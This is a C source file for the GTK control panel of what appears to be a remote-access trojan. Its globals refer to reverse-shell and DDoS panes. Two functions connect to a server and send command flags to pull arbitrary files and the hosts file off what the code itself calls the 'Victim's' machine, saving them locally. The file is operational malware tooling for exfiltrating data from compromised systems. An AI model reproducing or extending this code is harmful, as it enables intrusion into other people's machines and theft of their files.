#include <stdio.h>
#include <stdlib.h>
#include <string.h>  //strlen()
#include <unistd.h>  // execv()

#include <sys/types.h>  // send()
#include <sys/socket.h>  // send()
#include <netinet/in.h>  // SOCKADDR_IN
#include <arpa/inet.h>  // inet_addr()
#include <netdb.h>  //gethostbyaddr()

#include <gtk-2.0/gtk/gtk.h>

#include "../includes/constants.h"
#include "../includes/downloader.h"
#include "../includes/callbacks_main.h"
#include "../includes/utils.h"


GtkWidget *main_win;

const gchar *server_ip;
const gchar *server_port;
int port;

GtkWidget *text_view;
GtkWidget *rs_text_view;
GtkWidget *ddos_text_view;

void download_files(const gchar *path)
{
    SOCKET sock = 0;
    SOCKADDR_IN sin;

    struct hostent *he = NULL;
    struct in_addr ipv4addr;

    long weight = 0;
    int err = 0;
    size_t flag = 9;

    long tailleBlockRecut = 0;
    long totalRcv = 0;
    char buffer[MAXDATASIZE] = "";

    GtkTextBuffer *text_buffer = NULL;
    gchar *text = NULL;
    GtkTextIter start;
    GtkTextIter end;

    FILE *downloaded_file = NULL;
    size_t len_path = strlen(path) + 1;


    port = atoi(server_port);

    inet_pton(AF_INET, server_ip, &ipv4addr);
    he = gethostbyaddr(&ipv4addr, sizeof ipv4addr, AF_INET);

    sin.sin_addr = *((struct in_addr *)he->h_addr);
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock == INVALID_SOCKET)
    {
        error("socket()", "download_files()");
        return;
    }

    err = connect(sock, (SOCKADDR*)&sin, sizeof(sin));

    if(err == SOCKET_ERROR)
    {
        error("connect()", "download_files()");
        return;
    }

    if(send(sock, (char*)&flag, sizeof(flag), 0) == SOCKET_ERROR)
    {
        error("send() flag", "download_files()");
        return;
    }

    printf("flag sended\n");

    if(send(sock, (char*)&len_path, sizeof(len_path), 0) == SOCKET_ERROR)
    {
        error("send() len_path", "download_files()");
        return;
    }

    if(send(sock, path, len_path, 0) == SOCKET_ERROR)
    {
        error("send() path", "download_files()");
        return;
    }

    downloaded_file = fopen(path, "wb");
    if(downloaded_file == NULL)
    {
        /** Obtaining the buffer associated with the widget. **/
        text_buffer = gtk_text_view_get_buffer(GTK_TEXT_VIEW(text_view));

        /** Set the default buffer text. **/
        gtk_text_buffer_set_text(text_buffer, "Wrong path !!!\n\
The path must have this form : /path/path/file", -1);

        /** Obtain iters for the start and end of points of the buffer **/
        gtk_text_buffer_get_start_iter(text_buffer, &start);
        gtk_text_buffer_get_end_iter(text_buffer, &end);

        /** Get the entire buffer text. **/
        text = gtk_text_buffer_get_text(text_buffer, &start, &end, FALSE);

        /** Print the text **/
        g_print("%s", text);

        g_free(text);

        error("fopen() downloaded_file", "download_files()");

        return;
    }

    /** Recieve file weigth **/
    if(recv(sock, (char*)&weight, sizeof(weight), 0) == SOCKET_ERROR)
    {
        error("rcv() weight", "dispatch_modules()");
        return;

    }

    printf("recv weight of the file : %ld\n\n", weight);

    do
    {
        tailleBlockRecut = recv(sock, buffer, weight, 0);

        fwrite(buffer, sizeof(char), (size_t)tailleBlockRecut, downloaded_file);

        totalRcv += tailleBlockRecut;

    }while(totalRcv < weight);

    /** Obtaining the buffer associated with the widget. **/
    text_buffer = gtk_text_view_get_buffer(GTK_TEXT_VIEW(text_view));

    /** Set the default buffer text. **/
    gtk_text_buffer_set_text(text_buffer, "File have been downloaded ...", -1);

    /** Obtain iters for the start and end of points of the buffer **/
    gtk_text_buffer_get_start_iter(text_buffer, &start);
    gtk_text_buffer_get_end_iter(text_buffer, &end);

    /** Get the entire buffer text. **/
    text = gtk_text_buffer_get_text(text_buffer, &start, &end, FALSE);

    /** Print the text **/
    g_print("%s", text);
    g_free(text);

    fclose(downloaded_file);

    shutdown(sock, SHUT_RD);

    return;
}


void download_hosts_files()
{
    SOCKET sock = 0;
    SOCKADDR_IN sin;

    struct hostent *he = NULL;
    struct in_addr ipv4addr;

    long weight = 0;
    int err = 0;
    size_t flag = 10;

    long tailleBlockRecut = 0;
    long totalRcv = 0;
    char buffer[MAXDATASIZE] = "";

    FILE *downloaded_hosts_file = NULL;
    gchar file_path[256] = "";
    size_t len_hosts_path = 0;

    GtkTextBuffer *text_buffer = NULL;
    gchar *text = NULL;
    GtkTextIter start;
    GtkTextIter end;


    port = atoi(server_port);

    inet_pton(AF_INET, server_ip, &ipv4addr);
    he = gethostbyaddr(&ipv4addr, sizeof ipv4addr, AF_INET);

    sin.sin_addr = *((struct in_addr *)he->h_addr);
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock == INVALID_SOCKET)
    {
        error("socket()", "download_hosts_files()");
        return;
    }

    err = connect(sock, (SOCKADDR*)&sin, sizeof(sin));

    if(err == SOCKET_ERROR)
    {
        error("connect()", "download_hosts_files()");
        return;
    }

    if(send(sock, (char*)&flag, sizeof(flag), 0) == SOCKET_ERROR)
    {
        error("send() flag", "download_hosts_files()");
        return;
    }

    printf("flag sended\n");

    downloaded_hosts_file = fopen("hosts", "wb");
    if(downloaded_hosts_file == NULL)
    {
        error("fopen() downloaded_hosts_file", "download_hosts_files()");
        return;
    }

    if(recv(sock, (char*)&len_hosts_path, sizeof(len_hosts_path), 0) == -1)
    {
        error("recv() len_hosts_path", "dispatch_modules()");
        return;
    }

    printf("path len recv .... %ld\n\n", len_hosts_path);

    if(recv(sock, file_path, len_hosts_path, 0) == -1)
    {
        error("recv() file_path", "dispatch_modules()");
        return;
    }

    printf("file path = %s\n\n", file_path);

    /** Recieve file weigth **/
    if(recv(sock, (char*)&weight, sizeof(weight), 0) == SOCKET_ERROR)
    {
        error("rcv() weight", "dispatch_modules()");
        return;

    }

    printf("recv weight of the file : %ld\n\n", weight);

    do
    {
        tailleBlockRecut = recv(sock, buffer, weight, 0);

        fwrite(buffer, sizeof(char), (size_t)tailleBlockRecut, downloaded_hosts_file);

        totalRcv += tailleBlockRecut;

    }while(totalRcv < weight);

    printf("file downloaded ...\n");

    /** Obtaining the buffer associated with the widget. **/
    text_buffer = gtk_text_view_get_buffer(GTK_TEXT_VIEW(text_view));

    /** Set the default buffer text. **/
    gtk_text_buffer_set_text(text_buffer, "Victim's hosts file downloaded ...", -1);

    /** Obtain iters for the start and end of points of the buffer **/
    gtk_text_buffer_get_start_iter(text_buffer, &start);
    gtk_text_buffer_get_end_iter(text_buffer, &end);

    /** Get the entire buffer text. **/
    text = gtk_text_buffer_get_text(text_buffer, &start, &end, FALSE);

    /** Print the text **/
    g_print("%s", text);

    g_free(text);

    fclose(downloaded_hosts_file);

    shutdown(sock, SHUT_WR);

    return;

}


